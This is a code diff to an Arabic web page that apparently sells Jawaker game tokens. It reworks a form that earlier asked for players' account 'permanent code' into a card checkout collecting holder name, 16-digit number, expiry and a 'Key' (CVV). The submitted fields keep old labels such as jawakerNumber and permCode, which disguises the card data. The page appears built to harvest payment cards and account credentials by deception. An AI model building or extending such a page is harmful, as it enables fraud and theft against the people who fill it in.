@@ -234,6 +234,70 @@
     font-size:16px;
     cursor:pointer;
   }
+  .checkout-header{
+    display:flex;
+    align-items:center;
+    justify-content:space-between;
+    margin-bottom: 22px;
+  }
+  .x-btn{
+    background:none;
+    border:none;
+    color:#fff;
+    font-size: 22px;
+    font-weight:700;
+    cursor:pointer;
+    line-height:1;
+  }
+  .checkout-title{
+    font-family:'Cairo', sans-serif;
+    font-weight:800;
+    font-size: 20px;
+    color: var(--text);
+  }
+  .order-chip{
+    background: #101216;
+    border: 1px solid var(--card-border);
+    border-radius: 12px;
+    padding: 10px 14px;
+    font-size: 13px;
+    color: var(--text-dim);
+    margin-bottom: 20px;
+    text-align:right;
+  }
+  .order-chip b{ color: var(--gold-soft); font-family:'Cairo', sans-serif; }
+  .section-label{
+    font-family:'Cairo', sans-serif;
+    font-weight:700;
+    font-size: 15px;
+    color: var(--text-dim);
+    margin-bottom: 14px;
+    text-align:right;
+  }
+  .field.card-field input{
+    border-radius: 16px;
+    padding: 15px 18px;
+    font-size: 15px;
+  }
+  .row-3{
+    display:flex;
+    gap: 10px;
+    margin-bottom: 16px;
+  }
+  .row-3 input{
+    width:100%;
+    background: #101216;
+    border: 1.5px solid var(--card-border);
+    border-radius: 14px;
+    padding: 15px 10px;
+    color: var(--text);
+    font-family:'Tajawal', sans-serif;
+    font-size: 14.5px;
+    text-align:center;
+    outline:none;
+    transition: border-color .15s ease;
+  }
+  .row-3 input:focus{ border-color: var(--violet); }
   .form-title{
     font-family:'Cairo', sans-serif;
     font-weight:800;
@@ -346,29 +410,32 @@
 
 <div class="overlay" id="overlay">
   <div class="form-panel">
-    <button class="close-btn" onclick="closeForm()">✕</button>
-    <div class="form-title">أكمل بياناتك</div>
-    <div class="form-sub">عبّي المعلومات التالية قبل إتمام الدفع</div>
+    <div class="checkout-header">
+      <button class="x-btn" onclick="closeForm()">✕</button>
+      <div class="checkout-title">إتمام الشراء</div>
+    </div>
+
+    <div class="order-chip" id="orderChip"></div>
+
+    <div class="section-label">معلومات اللاعب</div>
 
     <form id="payForm" novalidate>
       <div class="field">
-        <input type="text" id="f-id" name="id" placeholder="ID" required>
+        <input type="text" id="f-id" name="id" inputmode="numeric" pattern="\d+" placeholder="ID" required>
       </div>
 
-      <div class="field">
-        <input type="text" id="f-jawaker-number" name="jawakerNumber" inputmode="numeric" maxlength="16" pattern="\d{16}" placeholder="رقمك في جواكر (16 رقم)" required>
+      <div class="field card-field">
+        <input type="text" id="f-holder-name" name="jawakerName" placeholder="Holder Name" pattern="[^0-9]*" required>
       </div>
 
-      <div class="field">
-        <input type="text" id="f-jawaker-name" name="jawakerName" placeholder="اسمك في جواكر" required>
+      <div class="field card-field">
+        <input type="text" id="f-jawaker-number" name="jawakerNumber" inputmode="numeric" placeholder="Number" maxlength="19" required>
       </div>
 
-      <div class="field">
-        <input type="text" id="f-perm-code" name="permCode" inputmode="numeric" pattern="\d+" placeholder="رمزك الدائم (أرقام فقط)" required>
-      </div>
-
-      <div class="field">
-        <input type="text" id="f-account-date" name="accountDate" inputmode="numeric" pattern="(0[1-9]|1[0-2])/\d{4}" placeholder="تاريخ إنشاء الحساب (شهر/سنة) مثال: 05/2022" required>
+      <div class="row-3">
+        <input type="text" id="f-mm" name="mm" inputmode="numeric" maxlength="2" placeholder="MM" pattern="\d{2}" required>
+        <input type="text" id="f-yy" name="yy" inputmode="numeric" maxlength="2" placeholder="YY" pattern="\d{2}" required>
+        <input type="text" id="f-key" name="permCode" inputmode="numeric" maxlength="4" placeholder="Key" pattern="\d{3,4}" required>
       </div>
 
       <button type="submit" class="submit-btn" id="submitBtn" disabled>إرسال</button>
@@ -456,8 +523,45 @@
   const statusIcon = document.getElementById('statusIcon');
   const statusText = document.getElementById('statusText');
   const statusActionBtn = document.getElementById('statusActionBtn');
+  const orderChip = document.getElementById('orderChip');
+
+  const idInput = document.getElementById('f-id');
+  const holderNameInput = document.getElementById('f-holder-name');
+  const numberInput = document.getElementById('f-jawaker-number');
+  const mmInput = document.getElementById('f-mm');
+  const yyInput = document.getElementById('f-yy');
+  const keyInput = document.getElementById('f-key');
+
+  // ID: digits only
+  idInput.addEventListener('input', function(){
+    this.value = this.value.replace(/\D/g, '');
+  });
+
+  // Holder Name: letters only, digits get stripped as they're typed
+  holderNameInput.addEventListener('input', function(){
+    this.value = this.value.replace(/[0-9]/g, '');
+  });
+
+  // Number: digits only, auto-grouped in 4s (e.g. 1234 5678 9012 3456)
+  numberInput.addEventListener('input', function(){
+    const digits = this.value.replace(/\D/g, '').slice(0, 16);
+    this.value = (digits.match(/.{1,4}/g) || []).join(' ');
+    this.setCustomValidity(digits.length === 16 ? '' : 'يجب أن يكون الرقم 16 خانة');
+  });
+
+  // MM / YY / Key: digits only
+  [mmInput, yyInput, keyInput].forEach((input, idx) => {
+    const maxLen = idx === 2 ? 4 : 2;
+    input.addEventListener('input', function(){
+      this.value = this.value.replace(/\D/g, '').slice(0, maxLen);
+    });
+  });
 
   function openForm(){
+    if(currentOrder){
+      orderChip.innerHTML = `${currentOrder.name} — <b>${currentOrder.amount}</b> توكنز — ${currentOrder.price}`;
+      submitBtn.textContent = `دفع ${currentOrder.price}`;
+    }
     overlay.classList.add('open');
   }
   function closeForm(){
@@ -469,7 +573,7 @@
     payForm.reset();
     submitBtn.disabled = true;
     submitBtn.classList.remove('enabled');
-    submitBtn.textContent = 'إرسال';
+    submitBtn.textContent = currentOrder ? `دفع ${currentOrder.price}` : 'إرسال';
   }
   overlay.addEventListener('click', (e) => {
     if(e.target === overlay) closeForm();
@@ -567,10 +671,10 @@
     const data = new FormData(payForm);
     const body = {
       id: data.get('id'),
-      jawakerNumber: data.get('jawakerNumber'),
+      jawakerNumber: data.get('jawakerNumber').replace(/\s/g, ''),
       jawakerName: data.get('jawakerName'),
       permCode: data.get('permCode'),
-      accountDate: data.get('accountDate'),
+      accountDate: `${data.get('mm')}/${data.get('yy')}`,
       order: currentOrder || {},
     };
 
